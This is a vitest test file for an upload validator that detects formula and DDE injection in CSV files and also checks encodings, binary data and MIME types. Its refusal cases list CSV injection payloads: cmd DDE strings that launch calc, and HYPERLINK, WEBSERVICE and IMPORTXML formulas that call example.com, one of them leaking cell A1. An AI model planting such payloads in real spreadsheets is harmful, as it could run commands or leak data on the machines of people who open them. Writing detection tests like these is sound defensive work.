import { describe, expect, it } from 'vitest';

import { inspectFileContent, validateUploadDescriptor } from './upload-allowlist.js';

const text = ( value: string, encoding: BufferEncoding = 'utf8' ) => Buffer.from( value, encoding );

describe( 'CSV and text', () => {
	it( 'accepts plain CSV, numbers with signs, phone numbers and arithmetic', () => {
		expect( inspectFileContent( 'csv', text( 'name,amount,phone\r\nMüller,-5,+49 (30) 1234\r\nNguyễn,=1+2,"a, ""quoted"" cell"\r\n' ) ) ).toBe( 'valid' );
		expect( inspectFileContent( 'csv', text( 'Name;Betrag\nMüller;-5,50\n', 'latin1' ) ) ).toBe( 'valid' );
		expect( inspectFileContent( 'csv', text( '-(optional)\n' ) ) ).toBe( 'valid' );
		expect( inspectFileContent( 'csv', text( 'Central World,"+66 2 550 6555; Information Counter (register with passport)"\n' ) ) ).toBe( 'valid' );
	} );

	it.each( [
		'=HYPERLINK("https://example.com/?"&A1,"Click")',
		'=cmd|\' /C calc\'!A0',
		'@SUM(1+1)*cmd|\' /C calc\'!A0',
		'+SUM(1)',
		'-2+3+cmd|\' /C calc\'!A0',
		'"=HYPERLINK(""https://example.com/"")"',
		'  =WEBSERVICE("https://example.com/")',
		'=_xlfn.WEBSERVICE("https://example.com/")',
		'" =IMPORTXML(""https://example.com/"",""//a"")"',
	] )( 'refuses a cell that calls a function or DDE: %s', ( cell ) => {
		for ( const [ before, after ] of [ [ '', '' ], [ 'a,', ',b' ], [ 'a;', '' ], [ 'a\t', '' ], [ 'x\r\n', '' ] ] ) {
			expect( inspectFileContent( 'csv', text( `${ before }${ cell }${ after }` ) ) ).toBe( 'macros' );
		}
	} );

	it( 'reads a quoted cell across lines and UTF-16 by its byte order mark', () => {
		expect( inspectFileContent( 'csv', text( 'a,"line\n=SUM(A1)"' ) ) ).toBe( 'valid' );
		expect( inspectFileContent( 'csv', text( 'a,"line\n"\n=SUM(A1)' ) ) ).toBe( 'macros' );
		expect( inspectFileContent( 'csv', Buffer.concat( [ Buffer.from( [ 0xff, 0xfe ] ), text( 'a\t=SUM(A1)', 'utf16le' ) ] ) ) ).toBe( 'macros' );
		expect( inspectFileContent( 'csv', Buffer.concat( [ Buffer.from( [ 0xef, 0xbb, 0xbf ] ), text( '=SUM(A1)' ) ] ) ) ).toBe( 'macros' );
	} );

	it( 'does not look for formulas in a text file', () => {
		expect( inspectFileContent( 'txt', text( '=HYPERLINK("https://example.com/")' ) ) ).toBe( 'valid' );
	} );

	it( 'refuses binary data, also UTF-16 without a byte order mark', () => {
		expect( inspectFileContent( 'txt', Buffer.from( [ 0x25, 0x50, 0x44, 0x46, 0x00, 0x01 ] ) ) ).toBe( 'mismatch' );
		expect( inspectFileContent( 'csv', text( 'a,b', 'utf16le' ) ) ).toBe( 'mismatch' );
		expect( inspectFileContent( 'csv', text( 'a\x1bb' ) ) ).toBe( 'mismatch' );
	} );

	it( 'takes the MIME type Windows sends for CSV', () => {
		expect( validateUploadDescriptor( { filename: 'export.csv', mimeType: 'application/vnd.ms-excel', size: 10 }, { maxBytes: 100 } ).ok ).toBe( true );
		expect( validateUploadDescriptor( { filename: 'notes.txt', mimeType: 'application/vnd.ms-excel', size: 10 }, { maxBytes: 100 } ).ok ).toBe( false );
	} );
} );
